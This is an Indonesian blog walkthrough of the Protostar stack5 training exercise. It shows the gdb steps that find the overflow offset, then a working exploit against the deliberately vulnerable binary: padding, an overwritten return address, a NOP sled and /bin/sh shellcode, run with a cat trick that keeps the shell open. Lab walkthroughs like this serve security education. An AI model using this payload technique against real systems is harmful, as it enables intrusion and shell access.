---
layout: post
title: "Protostar: stack5"
date: 2020-08-02 12:32:03 +0700
categories: [reversing, protostar]
---

Melanjutkan ke stack5. Berdasarkan [halaman resmi](https://exploit-exercises.lains.space/protostar/stack5/) dari [stack5](https://exploit-exercises.lains.space/protostar/stack5/), challenge kali ini kita akan diperkenalkan dengan **shellcode**. Berdasarkan [wikipedia](https://en.wikipedia.org/wiki/Shellcode), shellcode adalah sepotong kecil kode yang digunakan sebagai _payload_ dalam eksploitasi kerentanan perangkat lunak. Untuk lebih mengerti dan mengetahui mengenai shellcode saya rekomendasikan untuk membaca artikel yang sangat bagus dari Pak Yohanes [disini](https://yohan.es/security/buffer-overflow/shellcode/).

Berkas stack5 dapat ditemukan pada directory `/opt/protostar/bin`. Kita cek terlebih dahulu dengan utilitas `file`.

```bash
file stack5
```

output:
![output file stack5](/images/protostar-stack5-1.png)

Sama seperti yang sebelumnya, sekarang mari kita lihat source codenya.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Sangat singkat sekali! Sekarang mari kita cari ukuran buffer dan paddingnya dengan cara yang sama dengan saat kita mencari di [stack4](/belajar-reversing-protostar-stack4).

```bash
gdb -q stack5
set disassembly-flavor intel
disas main
b* 0x080483d4
r
ni
```

Pada baris pertama kita malakukan load stack5 ke gdb dengan mode quiet. Baris kedua mengatur syntax disassembly ke mode intel. Baris ketiga melakukan disassembly pada fungsi main. Baris keempat memasang breakpoint pada alamat 0x080483d4, saat pemanggilan fungsi gets (b merupakan singkatan dari break). Baris selanjutnya kita menjalankan stack5 (r merupakan singkatan dari run). Saat breakpoint tercapai, kita gunakan ni untuk melakukan next into, program akan meminta input. Seperti sebelumnya kita akan menggunakan bantuan dari [halaman ini](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html). Kita akan mengenerate 100 karakter saja.

output:
![output runtutan perintah diatas](/images/protostar-stack5-2.png)

Sekarang mari kita cari ukuran buffer+paddingnya.

```bash
info frame
x/s 0xbffff7bc
```

Perintah `info frame` akan menunjukkan alamat dari eip. Perintah selanjutnya untuk men examine dalam string isi dari **0xbffff7bc**.

output:
![output runtutan perintah diatas](/images/protostar-stack5-3.png)

Salin isi dari eip lalu cari ukuran buffer+padding pada [halaman berikut](https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html). Kita mendapatkan ukuran offset (buffer+padding) sebesar 76.

![ukuran offset](/images/protostar-stack5-4.png)

Pada challenge sebelumnya terdapat fungsi win yang kita jadikan tujuan. Namun disini tidak ada fungsi seperti itu, yang perlu kita lakukan ialah menjalankan shellcode. Jika kalian telah membaca [artikel dari pak yohanes](https://yohan.es/security/buffer-overflow/shellcode/). Tentunya kalian sudah mendapat gambaran langkah selanjutnya.

Kita akan coba memasukkan shellcode dan mengeksekusinya. Tapi sebelumnya kita akan mempelajari terlebih dahulu dua instruksi, `nop` dan `int3`. Berdasarkan wikipedia, **nop** atau **no operation**, merupakan instruksi dalam bahasa assembly, pernyataan bahasa pemrograman, atau perintah protokol komputer yang tidak melakukan apa-apa. Opcode dari nop adalah **90**. Sedangkan **int3** berdasarkan wikipedia, merupakan satu-byte instruksi yang digunakan oleh debugger untuk sementara waktu mengganti instruksi dalam program yang sedang berjalan untuk menetapkan breakpoint. Opcode dari int3 ialah **CC**. Lebih lanjut mengenai nop dan int3 dapat kalian baca di wikipedia atau [manual dari intel](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf).

Lalu akan kita gunakan untuk apa kedua instruksi diatas? Sebelumnya kembali dahulu ke gdb. Kita perlu membersihkan breakpoint yang sebelumnya lalu memasang breakpoint baru pada alamat yang lain.

```bash
del b
disas main
b* 0x080483d9
```

Perintah `del b` digunakan untuk menghapus breakpoint (delete breakpoint). Kali ini breakpoint akan kita pasang pada saat `leave`, gunakan perintah kedua untuk melihat alamatnya dan `b*` untuk memasang breakpoint.

output:
![hapus lalu pasang ulang breakpoint](/images/protostar-stack5-5.png)

Disini saya membuat sesi ssh baru ke mesin protostar untuk membuat payload. Alamat tujuan untuk eip sementara akan saya isi dengan `BBBB`. Payload akan saya taruh di directory `/tmp`.

```bash
python -c "print( 'A' * 76 + 'BBBB')" > /tmp/payload
cat /tmp/payload
```

output:
![buat payload](/images/protostar-stack5-6.png)

Sekarang mari kita coba gunakan payload tersebut di gdb. Sebagai catatan tanda **>** digunakan untuk mengalihkan stdout (standard output) menjadi stdin (standard input). Sedangkan tanda **<** sebaliknya. Selengkapnya dapat dibaca [disini](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)

```bash
r < /tmp/payload
info frame
x/s 0xbffff7bc
x/40x 0xbffff7bc
```

output:
![kondisis stack setelah payload dimasukkan](/images/protostar-stack5-7.png)

Dapat kalian lihat diatas jika **BBBB** sudah menimpa eip. Dengan perintah terakhir kita dapat men examine eip dalam hex sebanyak 40. Kita akan menggunakan alamat setelah eip tersebut untuk meletakkan payload dan tujuan eip. Mari kita modifikasi lagi payload kita.
Kita akan menambahkan opcode dari int3 setelah eip lalu mengarahkan eip ke 0xbffff7c0. Alamat 0xbffff7c0 didapatkan dari eip + 4byte (panjang eip) sehingga akan mengarahkan eip ke int3. Sebagai catatan perhitungan dilakukan dengan hex yaitu 1-f.

```bash
python -c "print( 'A' * 76 + '\xc0\xf7\xff\xbf' + '\xcc')" > /tmp/payload
cat /tmp/payload
```

Kita hapus seluruh breakpoint sebelumnya lalu jalankan ulang stack5 di gdb dengan payload baru.

```
del b
r < /tmp/payload
```

output:
![jalankan stack5 di gdb dengan payload baru](/images/protostar-stack5-8.png)

Instruksi kita dijalankan! Program mengeksekusi int3 sehingga muncul notifikasi _Program received signal SIGTRAP, **Trace/breakpoint trap**._ Selanjutnya ialah mengganti instruksi int3 dengan shellcode yang dapat mengeksekusi shell. Saya menggunakan shellcode [berikut](http://shell-storm.org/shellcode/files/shellcode-851.php) yang saya dapatkan dari [shell-storm.org](http://shell-storm.org/shellcode/).

```bash
python -c "print( 'A' * 76 + '\xc0\xf7\xff\xbf' + '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68')" > /tmp/payload

r < /tmp/payload #pada gdb
```

output:
![menjalankan pada gdb dengan payload baru](/images/protostar-stack5-9.png)

Terjadi eksekusi shell `dash` yang ditandai dengan, **Executing new program: /bin/dash**. Mari kita jalankan langsung tanpa gdb.

```bash
 python -c "print( 'A' * 76 + '\xc0\xf7\xff\xbf' + '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68')" | ./stack5
```

output:
![menjalankan langsung stack5 dengan payload baru](/images/protostar-stack5-10.png)

Terjadi segmentation fault! Terdapat perbedaan saat menjalankan stack5 dengan gdb dan secara langsung. Salah satu perbedaan tersebut ialah **posisi stack**, tempat kita memasang shellcode. Kalian dapat membaca lebih lanjut mengenai perbedaan ini dengan mencarinya di google. Lanjut saja ke cara penyelesaian masalah ini, kita akan memakai instruksi nop. Kita akan mengisi stack dengan instruksi nop yang banyak, diikuti dengan shellcode lalu mengarahkan eip ke nop. Dengan begitu kita tidak perlu **tepat** mengarahkan eip ke ke awal shellcode, secara otomatis eip akan mengarahkan ke shellcode jika ia mengarah ke padding nop yang kita berikan.

```bash
python -c "print( 'A' * 76 + '\xc0\xf7\xff\xbf' + '\x90'* 60 + '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68')"  | ./stack5
```

output:
![menjalankan stack5 dengan payload berisi nop](/images/protostar-stack5-11.png)

Tidak terjadi apa - apa, bahkan error sekalipun. Hal ini diakibatkan karena shell langsung tertutup setelah dijalankan. Untuk mengatasinya kita akan menggunakan bantuan `cat` untuk menjaga shell tetap terbuka dan memungkinkan kita untuk memasukkan input. Gunakan `man cat` jika ingin membaca manual dari utilitas cat.

```bash
python -c "print( 'A' * 76 + '\xc0\xf7\xff\xbf' + '\x90'* 60 + '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68')"  > /tmp/payload
(cat /tmp/payload; cat) | ./stack5
```

output:
![menjalankan stack5 dengan payload](/images/protostar-stack5-12.png)

Berhasil! kalian dapat mengonfirmasi dengan memasukkan perintah `id` dan dengan `whoami`. Untuk keluar gunakan **ctrl+c**.
